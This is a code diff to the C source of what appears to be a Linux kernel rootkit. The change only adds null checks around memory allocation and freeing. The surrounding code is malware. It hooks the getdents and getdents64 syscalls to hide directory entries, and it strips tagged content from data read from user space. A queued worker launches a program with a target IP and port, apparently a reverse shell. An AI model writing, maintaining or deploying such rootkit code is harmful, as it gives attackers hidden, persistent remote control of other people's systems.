@@ -127,7 +127,7 @@ void shell_execer(struct work_struct *work) {
     	char *argv[] = { task->path, "-t", task->ip, "-p", task->port, NULL };
 
     	exec(argv);
-    	kfree(task);
+    	if(task) kfree(task);
 }
 
 int shell_exec_queue(char *path, char *ip, char *port) {
@@ -170,16 +170,18 @@ int f_check(void *arg, int size) {
 	if ((size <= 0) || (size >= SSIZE_MAX)) return(-1);
 
 	buf = (char *) kmalloc(size+1, GFP_KERNEL);
+	if(!buf) return(-1);
+
 	if(__copy_from_user((void *) buf, (void *) arg, size)) goto out;
 
 	buf[size] = 0;
 
 	if ((strstr(buf, HIDETAGIN) != NULL) && (strstr(buf, HIDETAGOUT) != NULL)) {
-		kfree(buf);
+		if(buf) kfree(buf);
 		return(1);
 	}
 out:
-	kfree(buf);
+	if(buf) kfree(buf);
 	return(-1);
 }
 
@@ -188,8 +190,10 @@ int hide_content(void *arg, int size) {
 	int i, newret;
 
 	buf = (char *) kmalloc(size, GFP_KERNEL);
+	if(!buf) return(-1);
+
 	if(__copy_from_user((void *) buf, (void *) arg, size)) {
-		kfree(buf);
+		if(buf) kfree(buf);
 		return size;
 	}
 
@@ -202,10 +206,10 @@ int hide_content(void *arg, int size) {
 	newret = size - (p2 - p1);
 
 	if(__copy_to_user((void *) arg, (void *) buf, newret)) {
-		kfree(buf);
+		if(buf) kfree(buf);
 		return size;
 	}
-	kfree(buf);
+	if(buf) kfree(buf);
 	return newret;
 }
 
@@ -476,7 +480,7 @@ asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *di
 	if(copy_to_user(dirent, kdir, ret)) goto end;
 
 end:
-	kfree(kdir);
+	if(kdir) kfree(kdir);
 	return ret;
 }
 
@@ -519,7 +523,7 @@ asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent
 	if(copy_to_user(dirent, kdir, ret)) goto end;
 
 end:	
-	kfree(kdir);
+	if(kdir) kfree(kdir);
 	return ret;
 }
 
